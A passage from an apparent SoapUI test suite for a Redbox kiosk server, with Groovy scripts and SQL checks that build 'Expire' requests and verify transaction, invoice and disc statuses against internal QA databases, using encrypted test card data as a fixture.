ount%22+%3A+%220.2925%22%2C+%22GrandTotal%22+%3A+3.2925+%7D+%7D%5D%2C%22Discounts%22%3A+%5B%5D%7D%7D+</con:value></con:property><con:property><con:name>ReconcileGUID</con:name><con:value>519b8284-ef91-4d7a-aa49-f18207937712</con:value></con:property><con:property><con:name>BarcodeForTnx</con:name><con:value>001505076</con:value></con:property><con:property><con:name>NonVendedBarcodeForTnx</con:name><con:value>000150501</con:value></con:property><con:property><con:name>CardType</con:name><con:value>5</con:value></con:property><con:property><con:name>TransactionTotal</con:name><con:value>3.29</con:value></con:property><con:property><con:name>HasPhysicalPurchase</con:name><con:value>false</con:value></con:property><con:property><con:name>CCNumber</con:name><con:value/></con:property><con:property><con:name>CCType</con:name><con:value/></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>90284864596698</con:value></con:property><con:property><con:name>PurchaseFormats</con:name><con:value/></con:property><con:property><con:name>numOfPurchases</con:name><con:value/></con:property><con:property><con:name>RentalFormats</con:name><con:value/></con:property><con:property><con:name>numOfRentals</con:name><con:value/></con:property><con:property><con:name>SetDaysBack</con:name><con:value/></con:property><con:property><con:name>RentalTaxAmount</con:name><con:value/></con:property><con:property><con:name>PurchaseTaxAmount</con:name><con:value/></con:property><con:property><con:name>DiscountedSubTotal</con:name><con:value/></con:property><con:property><con:name>SubTotal</con:name><con:value/></con:property><con:property><con:name>RentalTitleIds</con:name><con:value>10580,10581,10582,986</con:value></con:property><con:property><con:name>PurchaseTitleIds</con:name><con:value/></con:property><con:property><con:name>LoyaltyFlag</con:name><con:value/></con:property><con:property><con:name>LoyaltyProductPrice</con:name><con:value/></con:property><con:property><con:name>LoyaltyProductId</con:name><con:value/></con:property><con:property><con:name>HasLoyaltyDiscount</con:name><con:value>0</con:value></con:property><con:property><con:name>HasPromoDiscount</con:name><con:value>0</con:value></con:property><con:property><con:name>NonLoyaltyProductId</con:name><con:value/></con:property><con:property><con:name>NonLoyaltyProductPrice</con:name><con:value/></con:property><con:property><con:name>testBucket</con:name><con:value/></con:property><con:property><con:name>DiscountTitleIds</con:name><con:value/></con:property><con:property><con:name>DiscountProductPrices</con:name><con:value/></con:property><con:property><con:name>DiscountPayload</con:name><con:value/></con:property><con:property><con:name>CCPayload</con:name><con:value>"CreditCard": {"FirstName": "Redbox","LastName": "Server","Number": "QQFW0oJmyR9i9AM5THWVcRo5lwKaUhUuIyLPGxhk+ffkWhNsp2lmRfGmH9IxH0xsOfyetH8W9lfrYTU27YohQEX1DJQT6zWWSr//u7Lps65BxFBokLsY0C1j6UtpokZdmSrSv9paCVAZa+npNqTBXkZHkviW8CvzzP4P0Xz0H+QaSUtIKvGcjKdUjq/E3dzqwSHL4WItWFUlPeZGVHSIh0WwKNnRZY8Gdh0FpEXcm1NjL2c/5jvG2HaKhODGhkICLNGmqWQx0+Jsmbz2CDm4jo/wO+uXDntZwEzITdBuvHHhKC60+1zbcfk8WInJkQkcIB73pDJ8vSR2cefCG8YT6qzFCkVp0Y5yTY8c+bM3THHfCVIo7jsZg1EGL4+bKp14PB6pq6I+lgvdhbX0ypLPna6iwYl6AwpNq7GxWTpO8thdLv63S/EZMpxUnD1NgKYCCXQCjJcy3c3Yq3HJf0erH5jRLbHPZ+ERKLPwbcNMrcpOa98YsJlkbu/O1qGu7qe52sazZhoCSSXcpFGVw1fQNrymkrjNOIozawDpCKDq+DJNnR1iKOJThKCl1uuQECClSQZRMPooeQPBiepwqBPldAulQAGEOrdDTHfCpuRX3fMtI2qi7DrLtTy+3imRkpscJOhggHyRcaqfqu6b/manpvzKVWRajXAgNav3uLzcT3Y=","PostalCode": "60181","ExpirationMonth": "12","ExpirationYear": "20","KeyId": 100002,"CardId": "RnXdywNtdx00t+spqi3nER05OtQQOeehgtxjucjW+5Y=","LastFour": "7760","CardType": 5,"Track2": "EK1LXxq9v3DAmPElsz228aoWIeIoDjkDcJytYkt8L0X4Sk4tZEtpQ++xI/JDfbLucvaMUqHw9UTM5HvFk7paS3FFG7fBVIUdXqm/XYMWS0I+OZb7Luqle6dkpz2oy/fOk+w6nnbuAmKYlp9vA46OtwU1vF6XHOBHqcZFeTgHCPGLvNHdkOY/AJAf+ON/OZFQlDXgylVljASL80fpZFcKb+SezuSwyjj/OnrNf7vlRuv8WdfQHJ9VmSzVjFYAb+lz774fJOkjccJfwTt2/CcSnpumnxGdJKDlW/Tbyh4H1nZfjzYjC3DSKqR8DO0i6nBhmGadFcQfvtsc7LzgS75X4mhOcoam36/BTW+RbsE389nlS9oEVLWG2qWE7tCO2ZL59Jpa5pHa6ZS+jB/yfeeJ9hd727MnrJX4aNja6U6H982V6f9C/FoFb1z/E/oV7dc0S0Z/TeNUHfskI8C5Xd/BXhCyWhbhEL/uesF0Jft5H6InJpe8YLpLWdOAbb3+kOdWCiuKPG30LuNYJcFzQH2O9/6vqTYDlGjl73lZ9L6gODbF1ubVYLN5JuAHOkh3Z7vk2jCr27ICK8YBT+C93278QPo3jBU7L+X/7L6TC/CP6gVM/RwQ3a5D5FLt8riEk+SJRIDjlrM75nmxTYEAFCkSUL4YssaL1wllvwTI93xhths="},</con:value></con:property><con:property><con:name>EstimatedLoyaltyAmount</con:name><con:value>0</con:value></con:property><con:property><con:name>EnableServiceFee</con:name><con:value>false</con:value></con:property><con:property><con:name>ServiceFeePayload</con:name><con:value/></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648637</con:value></con:property><con:property><con:name>ItemSourceType</con:name><con:value>0,0,0,0</con:value></con:property><con:property><con:name>ModifiedCart</con:name><con:value>false</con:value></con:property><con:property><con:name>HasUpsell</con:name><con:value>false</con:value></con:property><con:property><con:name>RentalMDVFlag</con:name><con:value>true,true,true,false</con:value></con:property><con:property><con:name>RentalMDVDiscNumber</con:name><con:value>1,2,3,null</con:value></con:property><con:property><con:name>PurchaseMDVFlag</con:name><con:value/></con:property><con:property><con:name>PurchaseMDVDiscNumber</con:name><con:value/></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c7ac4c10-ab96-4e99-b1ae-b373224e8115</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>2541f1eb-0d1a-4584-8ec1-f3a53a02616e</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>fd683bb0-82e9-4b17-ba81-0d133272fd8e</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>7482ad5c-957f-47b4-b757-a492aefbb406</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="Expire" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="7633d253-fadf-4f75-bab0-f5b9fa9f1d33"><con:description/><con:settings/><con:testStep type="groovy" name="Encode Message Body (Expire)" id="66b21363-be67-49a8-8ef7-d8fadf0e930c"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status;

def KioskId= context.expand( '${#TestCase#KioskID}' );
def ReferenceNumber = context.expand( '${#TestCase#ReferenceNumber}' );
requestPayload = "";

//Generate MessageGUID
def MessageId = UUID.randomUUID().toString();


//Build Expire Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"Expire\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskId,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"ReferenceNumber\": $ReferenceNumber";
requestPayload += "}";

// log to soapui log
log.info("Expire Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("ExpireGUID",MessageId.toString()); </script></con:config></con:testStep><con:testStep type="httprequest" name="Expire (Request)" id="654a4d8e-497a-45ba-82ba-de069d33458f"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="Expire (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent());
log.info ("Expire Response: $response");
assert response.contains("\"Success\":true,");
assert response.contains("\"HasErrors\":false,");</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>Global HTTP Settings</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Get ReferenceNumber" id="6525b8a9-78f7-410b-8ae2-1dfce31e9393"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def IsOffline = context.expand( '${#TestCase#IsOffline}');
def BarcodeForTnx = context.expand( '${#TestCase#BarcodeForTnx}');
Barcode = "";
if (BarcodeForTnx == "")
{
	Barcode = context.expand( '${#TestCase#NonVendedBarcodeForTnx}');
}
else
{
	Barcode = context.expand( '${#TestCase#BarcodeForTnx}');
}

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);
def getTnxQuery = "";

if (IsOffline == 'true')
{
	//Build SQL Query
	getTnxQuery += "Select TOP 1 "
	getTnxQuery += "\n"
	getTnxQuery += "t.Transaction_ID,t.InvoiceID "
	getTnxQuery += "\n"
	getTnxQuery += "From [Transaction] t"
	getTnxQuery += "\n"
	getTnxQuery += "Inner Join Disc_Transaction dt  on t.Transaction_ID = dt.Transaction_ID "
	getTnxQuery += "\n"
	getTnxQuery += "Inner Join Disc d  on d.Disc_id = dt.Disc_id "
	getTnxQuery += "\n"
	getTnxQuery += "Where d.RF_ID = '$Barcode'"
	getTnxQuery += "\n"
	getTnxQuery += "Order by t.Transaction_ID desc"

	def getTnxInfo = sql.firstRow(getTnxQuery);
	def TransactionID = getTnxInfo.Transaction_ID.toString();
	def InvoiceID = getTnxInfo.InvoiceID.toString();
	log.info ("TransactionID:$TransactionID; InvoiceID:$InvoiceID");
	testRunner.testCase.setPropertyValue("TransactionID",TransactionID);
	testRunner.testCase.setPropertyValue("InvoiceID",InvoiceID);
}
else
{
	log.info ("TransactionId is generated from Auth");
}</script></con:config></con:testStep><con:testStep type="jdbc" name="Check Transaction" id="2464d0f7-4391-45c4-90c9-f4e03f5ab107"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT  
	transaction_status,
	approvalcode,
	RentalType,
	OptInTypeId,
	BillingTypeID,
	IsOffline,
	shoppingCartType
FROM
	[Transaction](nolock)
WHERE 
	transaction_id = :txnid</con:query><con:assertion type="GroovyScriptAssertion" name="Validations" id="32f2af03-b987-432f-a201-9858d49438c3" disabled="true"><con:configuration><scriptText>//Get the actual values from JDBC response
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualAppprovalCode = holder.getNodeValue("//APPROVALCODE[1]");
String approve = actualAppprovalCode.toString();	
assert approve.substring(0,8) == 'Approved';

def numrentals = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def CCType = context.expand( '${#TestCase#CardType}' ).toInteger();
def actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]")
assert actualBillingTypeID == null

/* DISABLED FOR FIRST NIGHT BILLING CHANGES
int actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]").toInteger();
//Added if and else logic for PRM and PRG functionality and GiftCard.
if ((numrentals > 0 &amp;&amp; numpurchases > 0) || CCType == 6)
{
	assert actualBillingTypeID == 6; //Because of PRM and PRG functionality.
}
else
{
	assert actualBillingTypeID == 7;
}
*/</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check [RENTALTYPE]" id="41d4abab-7b86-425c-8d6c-ceeb83aaa819"><con:configuration><scriptText>def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def rentalType = holder.getNodeValue("//RENTALTYPE[1]");

assert rentalType == '3'</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="1ed83441-2817-4b26-9b40-e57d25b3b968" name="Validations-[TransactionStatus]"><con:configuration><scriptText>def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualTransactionStatus = holder.getNodeValue("//TRANSACTION_STATUS[1]").toInteger();
//Rental and Purchase Count
def rentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def purchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
//Check TransactionStatus
if (rentalCount > 0 &amp;&amp; purchaseCount == 0)
{
	assert (actualTransactionStatus == 21);
}
else if (rentalCount == 0 &amp;&amp; purchaseCount > 0)
{
	assert (actualTransactionStatus == 35);
}</scriptText></con:configuration></con:assertion><con:assertion type="XPath Match" id="d1846f08-2c8d-4394-91c1-3f8c8a531c24" name="Match content of [TRANSACTION_STATUS]" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]/text()</path><content>21</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="18dd4ffd-b1a7-41dd-a0d9-7e3acbf55b37" name="Match content of [BILLINGTYPEID]" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/BILLINGTYPEID[1]</path><content>&lt;BILLINGTYPEID/></content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:properties><con:property><con:name>txnid</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check DiscTransaction" id="0ee0e3b8-e93c-4e75-9524-1578b1653fd7"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	DISCTRANSACTION_STATUS
FROM
	disc_transaction (nolock)
WHERE
	transaction_id = :TransactionID</con:query><con:assertion type="GroovyScriptAssertion" id="083f13be-1903-4cfe-971b-c5d2b61e5086" name="DiscTransaction Status"><con:configuration><scriptText><![CDATA[def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check DiscTransaction#ResponseAsXml");
def actualDiscTransactionStatus = holder.getNodeValue("//Row[1]/DISCTRANSACTION_STATUS[1]");

def vendedRentals = context.expand( '${#TestCase#VendedRentalBarcodes}' )
def nonVendedRentals = context.expand( '${#TestCase#nonvendedRentalBarcodes}' )
def vendedPurchases = context.expand( '${#TestCase#VendedPurchaseBarcodes}' )
def nonVendedPurchases = context.expand( '${#TestCase#NonVendedPurchaseBarcodes}' )

if (vendedPurchases == "")
{
	if ((nonVendedRentals != "") && (vendedRentals == "")) 
	{
		assert actualDiscTransactionStatus.toInteger() == 1
	}		 
	else if ((nonVendedRentals == "") && (vendedRentals != ""))
	{
		assert actualDiscTransactionStatus.toInteger() == 2
	}		
	else if ((nonVendedRentals != "") && (vendedRentals != ""))
	{
		assert actualDiscTransactionStatus.toInteger() == 2
	}		
	else 
	{
		assert actualDiscTransactionStatus.toInteger() == 1
	}		
}
else
{
	assert actualDiscTransactionStatus.toInteger() == 2
}]]></scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TransactionID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="909fd2a0-7959-4cb6-941c-30cee3c8dc0d"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT TOP 1
	i.[Status] AS InvStatus, 
	i.[System], 
	i.CreatedBy, 
	i.StoreNumber,
	i.CollectionMethod,
	ii.[Status]  AS InvItemStatus
FROM
	[Invoice] i (nolock)
INNER JOIN [InvoiceItem] ii ON i.OID = ii.Invoice
WHERE 
	i.OID = :InvoiceID</con:query><con:assertion type="XPath Match" id="240a02f9-cf29-49b8-bec1-b5f1e1e60717" name="Match content of [STATUS]" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[1]/text()</path><content>0</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="efcc78e9-3208-4611-b3d8-4fbdcd0ddd89" name="Match content of [SYSTEM]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/SYSTEM[1]/text()</path><content>Rental Systems</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="96905afe-9a46-4b0b-9840-dfdfb72b774e" name="Match content of [CREATEDBY]" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/CREATEDBY[1]/text()</path><content>RB\KioskSvc_01_U</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="3c2f7519-7ffa-408a-b2e2-fd6ce8cd05da" name="InvoiceItem Status" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[2]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="4207b007-8259-4190-b87f-c52ed3829198" name="CollectionMethod"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualCollectionMethod = invholder.getNodeValue("//COLLECTIONMETHOD[1]").toInteger();

//Get the shopping cart type value from Get Transaction test step.
def tnxHolder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def shoppingCartType = tnxHolder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();
def RentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def PurchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def cardType = context.expand( '${#TestCase#CardType}' ).toInteger();

//based on config in QADB100.RedboxServerDB.dbo.KioskBillingConfig table

if ((PurchaseCount > 0)||(cardType == 6))
{
	assert actualCollectionMethod == 3;
}
else
{
	assert actualCollectionMethod == 6;
}</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="444868cb-53b3-4d5b-b65e-bda98e8c4f41" name="Invoice/InvoiceItem Status"><con:configuration><scriptText>//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Validate Invoice and InvoiceItem status.
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualInvoiceStatus = invholder.getNodeValue("//INVSTATUS[1]").toInteger();
def actualInvoiceItemStatus = invholder.getNodeValue("//INVITEMSTATUS[1]").toInteger();
def InvoiceID = context.expand( '${#TestCase#InvoiceID}' );
def CardType = context.expand( '${#TestCase#CardType}' ).toInteger();
//def AmountBase = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
def getAmount = sql.firstRow("Select Sum (Quantity * AmountBase) as TransactionTotal from InvoiceItem Where Invoice = $InvoiceID");
def AmountBase = getAmount.TransactionTotal
def RentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def PurchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
log.info ("AmountBase:$AmountBase; actualInvoiceStatus:$actualInvoiceStatus; actualInvoiceItemStatus:$actualInvoiceItemStatus");
//log.info ("CardType:$CardType; IsOffline:$IsOffline");
//Online Case

if ((AmountBase == null) || (AmountBase == 0E-20))
{
	if (CardType == 6)
	{		
     	if (RentalCount == 0 &amp;&amp; PurchaseCount > 0)
     	{
     		assert (actualInvoiceStatus == 4);
     		assert (actualInvoiceItemStatus == 15);
     	}
     	else
     	{ 		
     		assert (actualInvoiceStatus == 4);
     		assert (actualInvoiceItemStatus == 16);
     	}
	}
	else
	{
		assert (actualInvoiceStatus == 1);
     	assert (actualInvoiceItemStatus == 17);
	}
}
else
{
  if (PurchaseCount > 0 &amp;&amp; RentalCount &lt; 1)
  {
      assert (actualInvoiceStatus == 4);
      assert (actualInvoiceItemStatus == 15);
  }
  else
  {
      assert (actualInvoiceStatus == 1);
      assert (actualInvoiceItemStatus == 3);
  }
}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Disc Status" id="016af171-98c3-4906-b307-b210e72c902a"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	Physical_Status 
FROM 
	Disc as d
inner join 
	Disc_Transaction as dt
on 
	d.Disc_ID=dt.Disc_ID
where
	 dt.Transaction_ID= :TransactionID</con:query><con:assertion type="GroovyScriptAssertion" name="Assert node [Row]" id="39f9cf12-b464-42a1-82ef-b8f46f0da842"><con:configuration><scriptText>import com.eviware.soapui.support.XmlHolder
import java.util.*

def gv = new com.eviware.soapui.support.GroovyUtils(context);
def rawXML = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]}' )
def holder = gv.getXmlHolder(rawXML)
def nodecount = holder["count(//Results[1]/ResultSet[1]/Row)"]
def physicalstatusArray = [5] ;

def vendedRentals = context.expand( '${#TestCase#VendedRentalBarcodes}' )
def nonVendedRentals = context.expand( '${#TestCase#nonvendedRentalBarcodes}' )
def vendedPurchases = context.expand( '${#TestCase#VendedPurchaseBarcodes}' )
def nonVendedPurchases = context.expand( '${#TestCase#NonVendedPurchaseBarcodes}' )
log.info ("vendedRentals:$vendedRentals; vendedPurchases:$vendedPurchases");

for (i = 1; i &lt;= nodecount.toInteger(); i++)
{
    def responseAsXml = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]/ResultSet[1]/Row['+i+']/PHYSICAL_STATUS[1]}' );
    physicalstatusArray[i-1] = responseAsXml.toInteger();
    //log.info('physicalstatusArray : ' + physicalstatusArray)
}
    if(vendedPurchases != "")
    {
        //log.info("only purchase")
        assert physicalstatusArray.contains(8)
        
    }
    else if(vendedRentals != "")
    {
        //log.info("only Rental")
        assert physicalstatusArray.contains(3)
    }
    else 
    {
        def transactionStatus = context.expand( '${Check Transaction#ResponseAsXml#//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]}' );
        if (transactionStatus == '11')
        {
            assert physicalstatusArray.contains(9)
        }
        else
        {
            assert physicalstatusArray.contains(2)
        }        
    }</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TransactionID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Message Control" id="6e725cfa-b9d4-4394-8dd7-e12e0c7f6393"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	ProcessFlag
FROM 
	MessageControl(nolock)
WHERE
	MessageId = :GUID</con:query><con:assertion type="Simple Contains" name="Contains" id="4e246be7-4cee-4b19-9b66-d23e79c330d8"><con:configuration><token>&lt;PROCESSFLAG>2&lt;/PROCESSFLAG></token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:properties><con:property><con:name>GUID</con:name><con:value>${#TestCase#ExpireGUID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Expire Completed" id="402d2873-1091-4789-ba7a-8b6511460a4f"><con:settings/><con:config><script>//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Update Physical Status = 2 for Digital Codes.
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505 and Title_ID in (Select Title_ID from Title Where FormatId = 17)")</script></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
]]></con:tearDownScript><con:properties><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648704</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>RentalCount</con:name><con:value>2</con:value></con:property><con:property><con:name>CardType</con:name><con:value>6</con:value></con:property><con:property><con:name>TransactionID</con:name><con:value>1983189</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058281</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22Expire%22%2C%22MessageId%22%3A+%22b5484f09-ef2d-44e2-800e-578db9616cc2%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22ReferenceNumber%22%3A+5648704%7D</con:value></con:property><con:property><con:name>ExpireGUID</con:name><con:value>b5484f09-ef2d-4